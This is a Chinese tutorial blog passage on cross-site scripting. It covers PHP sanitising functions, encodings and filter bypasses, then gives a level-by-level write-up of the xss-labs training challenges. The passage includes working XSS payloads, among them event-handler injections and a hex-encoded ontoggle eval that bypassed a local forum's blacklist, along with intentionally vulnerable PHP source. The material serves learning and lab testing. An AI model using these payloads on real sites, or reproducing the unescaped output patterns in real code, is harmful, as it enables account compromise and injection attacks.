<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132559662.png" alt="image-20200416132559662"></p>
<p>验证</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132700892.png" alt="image-20200416132700892"></p>
<h5 id="2、htmlentities-函数"><a href="#2、htmlentities-函数" class="headerlink" title="2、htmlentities()函数"></a>2、htmlentities()函数</h5><p>这个函数对于过滤用户输入的数据非常有用，他会将一些特殊字符转换为HTML实体。例如，用户输入&lt;时就会被该函数转换为HTML实体&lt;(&amp;lt)，输入&gt;就会被转换为实体&amp;gt</p>
<p>htmlentities(string,flags,character-set,double_encode)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_htmlentities.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_htmlentities.asp</a></p>
<p>构造一个xss</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140523501.png" alt="image-20200416140523501"></p>
<p>在页面中输入，发现弹出了内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140656017.png" alt="image-20200416140656017"></p>
<p>进行过滤更改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140808003.png" alt="image-20200416140808003"></p>
<p>在页面运行，返回了scipt的字符串，如果不加过滤就会弹出document.domain的内容<img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140853720.png" alt="image-20200416140853720"></p>
<h5 id="3、strip-tags-函数"><a href="#3、strip-tags-函数" class="headerlink" title="3、strip_tags()函数"></a>3、strip_tags()函数</h5><p>strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签</p>
<p>注释：该函数始终会剥离HTML注释。这点无法通过allow参数改变</p>
<p>注释：该函数是二进制安全的</p>
<p>strip_tags(string,allow)</p>
<p>参考链接：<a href="https://www.w3school.com.cn/php/func_string_strip_tags.asp" target="_blank" rel="noopener">https://www.w3school.com.cn/php/func_string_strip_tags.asp</a></p>
<p>更改代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416141524570.png" alt="image-20200416141524570"></p>
<p>可以发现，他是直接删除了，JS的script标签，而不是进行了实体转换</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142010850.png" alt="image-20200416142010850"></p>
<h5 id="4、自定义xss-filter"><a href="#4、自定义xss-filter" class="headerlink" title="4、自定义xss filter"></a>4、自定义xss filter</h5><p>在网上有很多自定义的xss filter，进行自行下载</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142307890.png" alt="image-20200416142307890"></p>
<p>加入该函数</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142630506.png" alt="image-20200416142630506"></p>
<p>在页面中打开，去除了script标签</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142658469.png" alt="image-20200416142658469"></p>
<h4 id="编码转义介绍"><a href="#编码转义介绍" class="headerlink" title="编码转义介绍"></a>编码转义介绍</h4><h5 id="1、URL编码"><a href="#1、URL编码" class="headerlink" title="1、URL编码"></a>1、URL编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165118729.png" alt="image-20200416165118729"></p>
<p>百分号编码：url编码包含一个百分号（%），后面跟着两个标识字符的ascii码的十六进制数，例如：空格转换为”%20”。</p>
<h5 id="2、html编码"><a href="#2、html编码" class="headerlink" title="2、html编码"></a>2、html编码</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165359455.png" alt="image-20200416165359455"></p>
<p>实体编码：一般以”&amp;”开头，” ; “结尾，可以不加” ; “。如：“&lt;”转为“&lt;”</p>
<p>进制编码：以“&amp;#”开头，加上字符的数值，以” ; “结尾，可以不加“;”。字符的数值可以是任意十进制的ascii码，或unicode字符编码。十六进制的数值需要在编码数字前加“x”。如：“&lt;”转换为十进制的“&lt;”或十六进制的”&lt;”</p>
<h5 id="3、javascrip编码"><a href="#3、javascrip编码" class="headerlink" title="3、javascrip编码"></a>3、javascrip编码</h5><p>数字形式：\u后面加4位16进制数字（或\x后加2位16进制数字），按字符的uncode数据编码，不足位数以零填充，如：“&lt;”转为”\u003c”或者”\x3c”。其中”\u”开头的unicode转义方式可以在字符串之外的位置，其他的不可以</p>
<p>jsfuck：<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p>
<h5 id="4、编码含义"><a href="#4、编码含义" class="headerlink" title="4、编码含义"></a>4、编码含义</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416170820749.png" alt="image-20200416170820749"></p>
<h4 id="XSS过滤器绕过"><a href="#XSS过滤器绕过" class="headerlink" title="XSS过滤器绕过"></a>XSS过滤器绕过</h4><h5 id="1、本地环境搭建"><a href="#1、本地环境搭建" class="headerlink" title="1、本地环境搭建"></a>1、本地环境搭建</h5><p>在web程序中找到过滤的函数，然后拷贝到本地环境搭建完成</p>
<p>xss filter中的代码，加入了红框部分的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195054147.png" alt="image-20200416195054147"></p>
<p>在页面查看发现成功将script标签删除掉了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195258557.png" alt="image-20200416195258557"></p>
<h5 id="2、xss-payload测试"><a href="#2、xss-payload测试" class="headerlink" title="2、xss payload测试"></a>2、xss payload测试</h5><p>kali linux下自带字典，在CTF比赛中经常使用</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195713132.png" alt="image-20200416195713132"></p>
<p>这里肯定使用的是XSS.txt。</p>
<h5 id="3、自动化工具测试"><a href="#3、自动化工具测试" class="headerlink" title="3、自动化工具测试"></a>3、自动化工具测试</h5><p>可以使用burpsuite进行自动化探测，将字典放进去让其自己执行筛选</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416200741297.png" alt="image-20200416200741297"></p>
<h5 id="4、关注最新HTML内容"><a href="#4、关注最新HTML内容" class="headerlink" title="4、关注最新HTML内容"></a>4、关注最新HTML内容</h5><p>在进行XSS过程中一定要关注最新的HTML，尤其是新加入的标签，可能会被过滤导致XSS触发</p>
<p>例如HTML5中新标签</p>
<p><code>&lt;video src=1 onerror=alert(1)&gt;</code></p>
<p><code>&lt;audio src=1 onerror=alert(1)&gt;</code></p>
<p>参考：<a href="https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet" target="_blank" rel="noopener">https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</a></p>
<h4 id="XSS发生的位置"><a href="#XSS发生的位置" class="headerlink" title="XSS发生的位置"></a>XSS发生的位置</h4><h5 id="1、GET型URL中的XSS"><a href="#1、GET型URL中的XSS" class="headerlink" title="1、GET型URL中的XSS"></a>1、GET型URL中的XSS</h5><p>如果在URL中提交参数值，在页面中显示。很有可能存在XSS</p>
<p>这种就可以在输入框中直接输入xss代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203528298.png" alt="image-20200416203528298"></p>
<h5 id="2、POST型表单中的XSS"><a href="#2、POST型表单中的XSS" class="headerlink" title="2、POST型表单中的XSS"></a>2、POST型表单中的XSS</h5><p>如果在表单中提交的参数值，在页面中显示。很有可能存在XSS</p>
<p>表单提交在页面显示结果，但在URL没有显示结果在响应中是Form Data表示表单数据，这时候他一定是一个POST提交参数</p>
<p>还是直接在输入框直接输入XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203725722.png" alt="image-20200416203725722"></p>
<h5 id="3、JSON中的XSS"><a href="#3、JSON中的XSS" class="headerlink" title="3、JSON中的XSS"></a>3、JSON中的XSS</h5><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率</p>
<p>JSON最常用的格式是对象的键值对。例如：</p>
<p>{“firstName”:”Brett”,”lastName”:”McLaughlin”}</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416205446505.png" alt="image-20200416205446505"></p>
<h5 id="4、自定义HTTP头中的XSS"><a href="#4、自定义HTTP头中的XSS" class="headerlink" title="4、自定义HTTP头中的XSS"></a>4、自定义HTTP头中的XSS</h5><p>如果在HTTP自定义头中提交的参数值，在页面中显示。很有可能就存在XSS</p>
<p>进行抓包，发送到repeater模块</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210453280.png" alt="image-20200416210453280"></p>
<p>在里面定义一个bwapp然后运行，页面返回信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210905870.png" alt="image-20200416210905870"></p>
<p>改为XSS内容，执行，在代码中复制连接在页面打开</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211039263.png" alt="image-20200416211039263"></p>
<p>页面成功弹出弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211147311.png" alt="image-20200416211147311"></p>
<h4 id="存储型XSS漏洞挖掘灰盒测试"><a href="#存储型XSS漏洞挖掘灰盒测试" class="headerlink" title="存储型XSS漏洞挖掘灰盒测试"></a>存储型XSS漏洞挖掘灰盒测试</h4><h5 id="1、环境搭建"><a href="#1、环境搭建" class="headerlink" title="1、环境搭建"></a>1、环境搭建</h5><p>使用phpStudy搭建 微社区程序-4-4—ROCBOSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085414839.png" alt="image-20200417085414839"></p>
<h5 id="2、定向XSS挖掘"><a href="#2、定向XSS挖掘" class="headerlink" title="2、定向XSS挖掘"></a>2、定向XSS挖掘</h5><p>XSS漏洞可以存在于个人资料处，文章发表处或者留言评论处等</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085758601.png" alt="image-20200417085758601"></p>
<h5 id="3、黑名单审计"><a href="#3、黑名单审计" class="headerlink" title="3、黑名单审计"></a>3、黑名单审计</h5><p>私信位置没有被实体化，可以进行XSS，但是被黑名单过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090319747.png" alt="image-20200417090319747"></p>
<p>查看过滤的名单，没有过滤details和ontaggle</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090643047.png" alt="image-20200417090643047"></p>
<h5 id="4、绕过过滤，触发XSS"><a href="#4、绕过过滤，触发XSS" class="headerlink" title="4、绕过过滤，触发XSS"></a>4、绕过过滤，触发XSS</h5><p>已知过滤了javascript，构造了payload</p>
<p>因为javascript会被过滤掉，所以使用16进制进行绕过</p>
<p>打开details就会出发ontoggle事件</p>
<p><code>&quot;&gt;&lt;details open ontoggle=eval(&quot;\x6a\x61\x76\x61\x76\x61\x73\x63\x72\x69\x70\x74\x76\x3aalert(&#39;xss&#39;)&quot;)&gt;&lt;&quot;</code></p>
<p>进行私信发送</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091315408.png" alt="image-20200417091315408"></p>
<p>成功弹出XSS</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091334674.png" alt="image-20200417091334674"></p>
<h4 id="自动化XSS挖掘工具—xsser"><a href="#自动化XSS挖掘工具—xsser" class="headerlink" title="自动化XSS挖掘工具—xsser"></a>自动化XSS挖掘工具—xsser</h4><h5 id="1、xsser工具介绍"><a href="#1、xsser工具介绍" class="headerlink" title="1、xsser工具介绍"></a>1、xsser工具介绍</h5><p>xsser是一款针对web应用程序自动化挖掘、利用、报告xss漏洞的框架，kali下自带了xsser</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092125950.png" alt="image-20200417092125950"></p>
<h5 id="2、xsser工具原理"><a href="#2、xsser工具原理" class="headerlink" title="2、xsser工具原理"></a>2、xsser工具原理</h5><p>原理</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092243656.png" alt="image-20200417092243656"></p>
<h5 id="3、xsser帮助信息"><a href="#3、xsser帮助信息" class="headerlink" title="3、xsser帮助信息"></a>3、xsser帮助信息</h5><p>xsser -h</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093057564.png" alt="image-20200417093057564"></p>
<p>注意：使用命令行工具时，不需要全部记忆参数，只需要熟练或用到时查找即可</p>
<h5 id="4、xsser启动方式"><a href="#4、xsser启动方式" class="headerlink" title="4、xsser启动方式"></a>4、xsser启动方式</h5><p>xsser启动方式可以分为命令行启动、图形化界面启动</p>
<p>在终端中以图形化界面启动输入</p>
<p><code>xsser --gtk</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093744922.png" alt="image-20200417093744922"></p>
<h4 id="XSS-fuzzing工具"><a href="#XSS-fuzzing工具" class="headerlink" title="XSS fuzzing工具"></a>XSS fuzzing工具</h4><h5 id="1、XSStrike工具介绍"><a href="#1、XSStrike工具介绍" class="headerlink" title="1、XSStrike工具介绍"></a>1、XSStrike工具介绍</h5><p>XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。</p>
<p>项目地址：<a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a></p>
<h5 id="2、XSStrike工具安装"><a href="#2、XSStrike工具安装" class="headerlink" title="2、XSStrike工具安装"></a>2、XSStrike工具安装</h5><p>XSStrike只能运行在py3.6以上版本</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095550503.png" alt="image-20200417095550503"></p>
<h5 id="3、XSStrike帮助信息"><a href="#3、XSStrike帮助信息" class="headerlink" title="3、XSStrike帮助信息"></a>3、XSStrike帮助信息</h5><p>xsstrike -h查看帮助信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095751376.png" alt="image-20200417095751376"></p>
<h5 id="4、XSStrike实例演示"><a href="#4、XSStrike实例演示" class="headerlink" title="4、XSStrike实例演示"></a>4、XSStrike实例演示</h5><p>python3 xsstrike.py -u “URL”</p>
<p>例如：</p>
<p>​    python3 xsstrike.py -u “<a href="http://192.168.1.102/xss-labs/level1.php?name=test&quot;" target="_blank" rel="noopener">http://192.168.1.102/xss-labs/level1.php?name=test&quot;</a>    </p>
<p>如果浏览器过滤的xss需要关闭xss筛选器</p>
<p>复制payload在浏览器的值后面输入</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417101428690.png" alt="image-20200417101428690"></p>
]]></content>
  </entry>
  <entry>
    <title>xss-labs</title>
    <url>/2020/04/22/xss-labs/</url>
    <content><![CDATA[<h4 id="xss-labs第一关"><a href="#xss-labs第一关" class="headerlink" title="xss-labs第一关"></a>xss-labs第一关</h4><p>源码</p>
<p>分析</p>
<p>分析：</p>
<ul>
<li>后台源码将用户以GET方式提交的参数name，原封不动地显示在HTML页面中，所以将弹框语句放入name变量中即可：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level2.php?keyword&#x3D;test&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level1&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level1&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;name&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;欢迎用户&quot;.$str.&quot;&lt;&#x2F;h2&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level1.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造一个内容，这里输入111，F12查看</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113056134.png" alt="image-20200417113056134"></p>
<p>这里没有进行任何过滤和防护，而且是直接在h2标签中，这样直接使用使用script标签构造XSS</p>
<p>payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113334965.png" alt="image-20200417113334965"></p>
<h4 id="xss-labs第二关"><a href="#xss-labs第二关" class="headerlink" title="xss-labs第二关"></a>xss-labs第二关</h4><p>源码</p>
<p>分析：</p>
<p><code>htmlspecialchars</code>：</p>
<ul>
<li>作用：把预定义的字符转换为 HTML 实体，而不是作为标签运行；如果不用HTMLSpecialChars，就会导致读取时，把” <script>"之类的HTML标签带有功能地输出。</li>
<li>HTML实体格式：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;entity_name;</span><br><span class="line">或者</span><br><span class="line">&amp;#entity_number;</span><br></pre></td></tr></table></figure>

<ul>
<li>转化规则：</li>
</ul>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417154345824.png" alt="image-20200417154345824"></p>
<ul>
<li>如下例，在使用了htmlspecialchars后，将输出字符串""；当不使用时，则会弹框。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str&#x3D;&quot;&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">echo htmlspecialchars($str); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>本例中，在返回的HTML页面的第一处使用了htmlspecialchars，而第二处没有使用，且两处都没有过滤机制。所以我们在第二处闭合<code>&lt;input&gt;</code>标签，直接弹框：</p>
<p>payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level3.php?writing&#x3D;wait&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level2&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level2&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level2.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;&quot;搜索&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level2.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，F12查看，如果找不到ctrl+F进行搜索。</p>
<p>这里在input标签中，进行了双引号包裹。所以需要进行闭合标签</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113440241.png" alt="image-20200417113440241"></p>
<p>闭合标签因为是双引号闭合格式"></p>
<p>复制payload提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417113634778.png" alt="image-20200417113634778"></p>
<h4 id="xss-labs第三关"><a href="#xss-labs第三关" class="headerlink" title="xss-labs第三关"></a>xss-labs第三关</h4><p>源码</p>
<p>分析</p>
<p>一共有两处转义：</p>
<ul>
<li>第一处转义，输入被转义为html实体，不能直接执行；</li>
<li>第二处转义，输入被转义为html实体，不能直接执行，也不能闭合双引号。但是单引号没被转义。</li>
<li>所以可以用单引号闭合input标签，使用不包含被转义特殊字符的弹框方式。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level4.php?keyword&#x3D;try harder!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level3&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level3&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;	</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level3.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417114943215.png" alt="image-20200417114943215"></p>
<p>发现和第二关一样，闭合提交</p>
<p>发现，尖括号被转义了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115114909.png" alt="image-20200417115114909"></p>
<p>所以就不能使用尖括号进行xss了，这里可以使用事件或者伪协议等</p>
<p>事件payload：<code>&#39;onclick=&#39;alert(1)</code></p>
<p>因为这里使用的是onclick所以提交之后需要单击一下输入框才能弹出弹框</p>
<p>如果不想单击使用onmouseover进行提交，提交之后鼠标放到输入框就会弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115310530.png" alt="image-20200417115310530"></p>
<p>伪协议payload：'onclick='javascript:alert(1)</p>
<p>进行提交，弹出弹框。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115702177.png" alt="image-20200417115702177"></p>
<h4 id="xss-labs第四关"><a href="#xss-labs第四关" class="headerlink" title="xss-labs第四关"></a>xss-labs第四关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>将用户输入个keyword中的<和>替换为空，但在input标签内并未转义。所以直接闭合input标签中的value（不能闭合整个input标签）并使用不带尖括号但弹框方式即可。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level5.php?keyword&#x3D;find a way out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level4&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level4.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，响应中查找</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115758872.png" alt="image-20200417115758872"></p>
<p>进行闭合，尝试，尖括号过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115832532.png" alt="image-20200417115832532"></p>
<p>使用事件来进行xss尝试</p>
<p>使用单引号闭合的时候发现颜色不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417120155860.png" alt="image-20200417120155860"></p>
<p>在使用双引号</p>
<p>payload：<code>&quot;onclick=&quot;alert(1)</code></p>
<p>成功闭合，伪协议用法相同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417120248869.png" alt="image-20200417120248869"></p>
<h4 id="xss-labs第五关"><a href="#xss-labs第五关" class="headerlink" title="xss-labs第五关"></a>xss-labs第五关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>对<script和on关键字进行了过滤</li>
<li>第二次引用keyword时没有转义，可以闭合input标签；然后采用不含<script和on的弹框方式</li>
</ul>
